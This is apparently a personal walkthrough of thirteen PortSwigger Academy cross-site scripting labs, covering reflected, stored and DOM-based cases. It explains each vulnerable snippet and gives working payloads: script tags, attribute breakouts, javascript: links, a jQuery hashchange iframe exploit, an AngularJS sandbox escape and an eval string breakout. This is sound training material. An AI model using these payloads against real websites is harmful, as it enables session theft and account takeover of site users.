# Cross-Site Scripting (XSS) (Labs: Portswigger Academy)

### Theroy

There are three main types of XSS attacks. These are:

* [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting), where the malicious script comes from the current HTTP request.
* [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting), where the malicious script comes from the website's database.
* [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting), where the vulnerability exists in client-side code rather than server-side code.

### Labs from PortSwigger Academy

🟩🟩APPRENTICE LAB🟩🟩

#### Lab 1: Reflected XSS into HTML context with nothing encoded

This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the `alert` function.

vulnerable search request:

```
https://0a6c00260467044d85d8ea36004700cc.web-security-academy.net/?search=<sushil>
```

* passed search string is reflected
* Viewing page source reveals, special character are not encoded.

xss payload

```
<script>alert(0)</script>
```

page source:

```html
<h1>0 search results for '<script>alert(0)</script>'</h1>
```

#### Lab 2: Stored XSS into HTML context with nothing encoded

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the `alert` function when the blog post is viewed.

vulnerable request:

```
POST /post/comment HTTP/2
Host: 0aa50063043583d680b40354005e007c.web-security-academy.net
Cookie: session=Hs14etAGsOW5T6yPJxXRSBJuMPvAX9d6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 125
Origin: https://0aa50063043583d680b40354005e007c.web-security-academy.net
Referer: https://0aa50063043583d680b40354005e007c.web-security-academy.net/post?postId=6
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=qaU40ssl7cVcMa4USawwEPDtR1FEyy1N&postId=6&comment=<thisiscomment>&name=<thisisname>&email=a@gmail.com&website=
```

page source:

```html
<section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            &lt;thisisname&gt; | 29 October 2025
                        </p>
                        <p><thisiscomment></p>
                        <p></p>
                    </section>
```

`name` is encoded but `comment` section is not encoded

xss payload

```
<script>alert(0)</script>
```

page source:

```html
<section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            &lt;thisisname&gt; | 29 October 2025
                        </p>
                        <p><script>alert(0)</script></p>
                        <p></p>
                    </section>
```

#### Lab 3: DOM XSS in document.write sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

vulnerable request:

```
https://0a63001e04a7ce8981929d79001c00da.web-security-academy.net/?search=<sushil>
```

The passed value is used in two places.

```html
<section class=blog-header>
                        <h1>1 search results for '&lt;sushil&gt;'</h1>
                        <hr>
                    </section>
```

* properly encoded here.

next is:

```
<img src="/resources/images/tracker.gif?searchTerms=<sushil>">
```

due to the use of following script.

```js
<script>
                        function trackSearch(query) {
                            document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
                        }
                        var query = (new URLSearchParams(window.location.search)).get('search');
                        if(query) {
                            trackSearch(query);
                        }
                    </script>
```

which means, the passed search parameter is used in `<img>` tag without encoding.

XSS Payload

```
" onload=alert(1)><"
```

this makes the final implemented script as:

```
<img src="/resources/images/tracker.gif?searchTerms=" onload=alert(1)><"">
```

#### Lab 4: DOM XSS in innerHTML sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.

To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

vulnerable code:

```js
<section class=blog-header>
                        <h1><span>0 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
                        <script>
                            function doSearchQuery(query) {
                                document.getElementById('searchMessage').innerHTML = query;
                            }
                            var query = (new URLSearchParams(window.location.search)).get('search');
                            if(query) {
                                doSearchQuery(query);
                            }
                        </script>
                        <hr>
                    </section>
```

explaination:

| Statement                                                                         | Explanation                                  |
| --------------------------------------------------------------------------------- | -------------------------------------------- |
| `var query = (new URLSearchParams(...)).get('search')` gets the value of `search` | From URL `?search=hello` → `query = "hello"` |
| `if(query)` checks if search exists                                               | Prevents error if no search                  |
| `doSearchQuery(query)` passes `"hello"` to function                               | Function receives `"hello"`                  |
| `innerHTML = query` puts `"hello"` inside `<span id="searchMessage">`             | Replaces content                             |

In conclusion, what ever is passed in to search query, it is passed and filled inside span tag.

```html
<span>1 search results for '</span><span id="searchMessage">hello</span><span>'</span>
```

XSS payload for span tag.

```
<img src=x onerror=alert('XSS')>
```

`<script>alert(0)</script>` **will NOT work** when injected into a `<span>` via innerHTML.

#### Lab 5: DOM XSS in jQuery anchor href attribute sink using location.search source

This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.

To solve this lab, make the "back" link alert `document.cookie`.

vulnerable code:

```js
<script> 
	$(function() { 
		$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath')); 
	}); 
</script>
```

explanation of code:

* this jQuery is fired once the site is fully loaded.
* `$('#backLink')` --> jQuery searches the DOM for an element with `id="backLink"`
* `(new URLSearchParams(window.location.search)).get('returnPath')`--> extracts the value of returnPath from url.
* `$('#backLink').attr("href", {value from above step})` --> `<a id="backLink">` element now receives a new href.

So, in conclusion, this code takes the value of `returnPath` from the URL and sets it as the `href` (destination) of the `<a id="backLink">` link.

before: `<a id="backLink" >Back</a>`

after: `<a id="backLink" href="/">Back</a>`

xss payload:

```js
javascript:alert(document.cookie)
```

final form of html after xss injection.

```js
<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
```

Why `"</a> <script>alert(0)</script><"` wont work.

* You are **not** injecting into .innerHTML or .html()
* You are setting the **href attribute**
* So the browser treats your payload as a **URL**, not HTML

#### Lab 6: DOM XSS in jQuery selector sink using a hashchange event

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

vulnerable code:

```js
< script >
    $(window).on('hashchange', function() {
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });    
</script>

```

code explanation:

* when URL hash changes (e.g. `#POST1`), automatically scroll to the blog post with matching `<h2>` title.
* `$(window).on('hashchange', function() { ... });` -->listens for change in URL hash
* `window.location.hash → "#Hello-World"`
* `window.location.hash.slice(1) → "Hello-World"`
* `decodeURIComponent("Hello%20World") → "Hello World"`
* `$('section.blog-list h2:contains("Hello World")')`
  * jQuery selectory finds `<h2>` tags
  * inside `<section class="blog-list">`
  * Whose text contains `"Hello World"`
* `var post = $('...');` --> stores the jQuery object of the matching `<h2>` tag
* `if (post) post.get(0).scrollIntoView();` --> if there exist data in post variable then it scrolls to that part.

In conclusion, it captures the content of `#` from URL (on change), finds if that content presence in `<h2>` tag inside `blog-list` section. after that it scrolls to that section.

```
URL: yoursit.com/blog#My%20Post
   ↓
1. hashchange fires
   ↓
2. hash = "#My%20Post"
   ↓
3. slice(1) = "My%20Post"
   ↓
4. decode = "My Post"
   ↓
5. $('section.blog-list h2:contains("My Post")')
   ↓
6. post = [ <h2>My Post</h2> ]
   ↓
7. if(post) → true
   ↓
8. post.get(0).scrollIntoView()
   ↓
🏆 PAGE SCROLLS TO "My Post"
```

XSS payload

```
visit
https://0a9c001b03b0c2898153b10200920076.web-security-academy.net/#random

and then

https://0a9c001b03b0c2898153b10200920076.web-security-academy.net/#<img src=1 onerror=print()>
```

how this payload works.

* Browser detects the hash change from `random` to `<img src=1 onerror=alert(1)>` so, `on('hashchange')` is triggered
* `decodeURIComponent(window.location.hash.slice(1))` captures, slices and URL decodes the value after `#`
* Final selector: `$('section.blog-list h2:contains(<img src=1 onerror=alert(1)>)')`
* jQuery’s Sizzle engine tries to evaluate the selector. It misinterprets the `<img...>` as HTML to inject into a temporary DOM context to "search" for matches.

**Sizzle's internal process (BUGGY behavior):**

1. Parse the selector: h2:contains`(<img src=1 onerror=alert(1)>)`
2. **Sees \<img...> and thinks:** _"Oh! This looks like HTML!"_
3. **Instead of treating it as a literal string**, Sizzle **creates a temporary DOM** with: `<div><img src=1 onerror=print(1)></div>`
4. **Tries to "search"** for `<h2>` elements that contain this HTML. and XSS executes during this temporary DOM creation! This is due to vulnerability in [jQuery Version](https://threatmon.io/what-is-jquery-xss-vulnerability-version/).

For the xss payload to trigger there need to be hashchange. For victim this can be achieved using iframe

```js
<iframe src="https://0a1d00ed04e0bca48155436000970031.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

```

#### Lab 7: Reflected XSS into attribute with angle brackets HTML-encoded

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.

for search term `<sushil>`

```html
<form action=/ method=GET>
                            <input type=text placeholder='Search the blog...' name=search value="&lt;sushil&gt;">
                            <button type=submit class=button>Search</button>
                        </form>
```

* both `< and >` are url encoded, but the supplied data is reflected inside attribute.

for search term `"sushil"`

```html
<form action=/ method=GET>
                            <input type=text placeholder='Search the blog...' name=search value=""sushil"">
                            <button type=submit class=button>Search</button>
                        </form>
```

* `"` is not encoded.

XSS payload by introducing new attribute.

```
" onfocus="alert(1)

or
" onfocus="alert(1)" autofocus" 

or
"onmouseover="alert(1)

```

<figure><img src="../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

#### Lab 8: Stored XSS into anchor `href` attribute with double quotes HTML-encoded

This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

vulnerable point.

```html
<section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar"><a id="author" href="http://<&quot;thisiswebsite&quot;>.com">&lt;&quot;thisisname&quot;&gt;</a> 
                        | 29 October 2025
                        </p>
                        <p>&lt;&quot;thisiscomment&quot;&gt;</p>
                        <p></p>
                    </section>
```

passed website url's `"` is HTML-encoded

xss payload

```
javascript:alert()
```

```html
<section class="comment">
                        <p>
<img src="/resources/images/avatarDefault.svg" class="avatar"><a id="author" href="javascript:alert()">asdfas</a> | 29 October 2025
                        </p>
                        <p>a</p>
                        <p></p>
                    </section>
```

#### Lab 9: Reflected XSS into a JavaScript string with angle brackets HTML encoded

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

when search parameter is passed as `<"sushil">`

```js
<script>
var searchTerms = '&lt;"sushil"&gt;';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

from the passed value, `< and >` are HTML encoded, but `' and "` are not encoded.

XSS Payload

```html
'; alert(0); var dummy = '
```

this payload will edit the script tag as:

```
<script>
var searchTerms = ''; alert(0); var dummy = '';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

alternative xss payload:

```
'-alert(1)-'


```

```
<script>
var searchTerms = ''-alert(1)-'';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

other payload

```
';alert(1)//asdfasdf
```

🟦🟦PRACTITIONER LABS🟦🟦

#### Lab 10: DOM XSS in document.write sink using source location.search inside a select element

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the `alert` function.

Vulnerable Code:

```html
< script >
    var stores = ["London", "Paris", "Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');


document.write('<select name="storeId">');
if (store) {
    document.write('<option selected>' + store + '</option>');
}
for (var i = 0; i < stores.length; i++) {
    if (stores[i] === store) {
        continue;
    }
    document.write('<option>' + stores[i] + '</option>');
}
document.write('</select>'); <
/script>
```

code explanation:

* `var store = (new URLSearchParams(window.location.search)).get('storeId');` --> gets the value of storeId from the URL.
* `document.write('<select name="storeId">');` --> start writing the dropdown HTML
* `if (store) { document.write('<option selected>' + store + '</option>'); }` --> if store exist , adds pre-selected option with the value
  * `selected` → this option appears chosen by default
* `for` loop → Add remaining options
  *
    * Loops through **all stores**
  * **Skips** the one already added (if store exists)
  * Adds each as an `<option>`
* `document.write('</select>');` --> closes the dropdown

Final Output Example: **Example 1: URL = ?storeId=Paris**

```
<select name="storeId">
  <option selected>Paris</option>
  <option>London</option>
  <option>Milan</option>
</select>
```

**OUTPUT**

```
<select name="storeId">
  <option selected><script>alert('XSS')</script></option>
  <option>London</option>
  ...
</select>
```

XSS Payload:

```
<script>alert('XSS')</script>
```

In URL:

```
https://0ae70062046081df801da8be005000b8.web-security-academy.net/product?productId=17&storeId=<script>alert('XSS')</script>
```

#### Lab 11: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the `ng-app` attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the `alert` function.

<figure><img src="../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

keythings

* use passed `< and >` are html encoded
* angular js is used
* `ng-app` attribute is added to body element. This means in anywhere within the body HTML element we are able to execute Javascript using `{{ }}`

for example:

<figure><img src="../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

but we cannot use `{{alert()}} or {{print()}}` because angularJS javascript sandbox doesnot give us access to these type of functions with in double curly braces.

XSS payload:

```
{{$on.constructor('alert(1)')()}}
```

Watch this to better understand: [https://youtu.be/P7\_JPsX1ses](https://youtu.be/P7_JPsX1ses)

#### Lab 12: Reflected DOM XSS

This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that calls the `alert()` function.

<figure><img src="../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

there is use of `searchResults.js`&#x20;

viewing the js file reveals the use of eval function

<figure><img src="../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

after we do search, there exits additional request which gives json response

<figure><img src="../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

combining everything.

from the request `/search-results?search=sushil` the response value `searchTerm` is passed onto the `eval` function of `searchResults.js`

<figure><img src="../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

JSON response is escaping `"`

The main idea here is to get something like this in eval function;

```js
eval('var searchResultsObj = "test"; alert(0);');
```

so we need a way to escape the `" "`

<figure><img src="../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

`"` is escaped

<figure><img src="../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

`\ is escaping \` so `"` is free

<figure><img src="../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

XSS Payload

```js
\" };alert(0);//
```

#### Lab 13: Stored DOM XSS

This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the `alert()` function.

XSS Payload:

```
<p></p><img src=x onerror=alert('XSS')><p></p>

```

![](app://0b9390a0ba76fd1f8c63f5d0d851f87a30f6/C:/Users/dolla/OneDrive/Obsidian/The%20Brain/08%20-%20Archive/01%20-%20Attachments/Pasted%20image%2020251030183919.png?1761828859598)

Actual method:

* there exist `resources/js/loadCommentsWithVulnerableEscapeHtml.js`
* this js file is responsible for HTML encoding `<`and `>`![](app://0b9390a0ba76fd1f8c63f5d0d851f87a30f6/C:/Users/dolla/OneDrive/Obsidian/The%20Brain/08%20-%20Archive/01%20-%20Attachments/Pasted%20image%2020251030184109.png?1761828969124)

![](app://0b9390a0ba76fd1f8c63f5d0d851f87a30f6/C:/Users/dolla/OneDrive/Obsidian/The%20Brain/08%20-%20Archive/01%20-%20Attachments/Pasted%20image%2020251030184149.png?1761829009475)

there exist a loophole, it only encodes the 1st instances of the angle brackets![](app://0b9390a0ba76fd1f8c63f5d0d851f87a30f6/C:/Users/dolla/OneDrive/Obsidian/The%20Brain/08%20-%20Archive/01%20-%20Attachments/Pasted%20image%2020251030184252.png?1761829072067)

which means, we can use this payload to get xss

```
1<><img src=1 onerror=alert(1)>
```
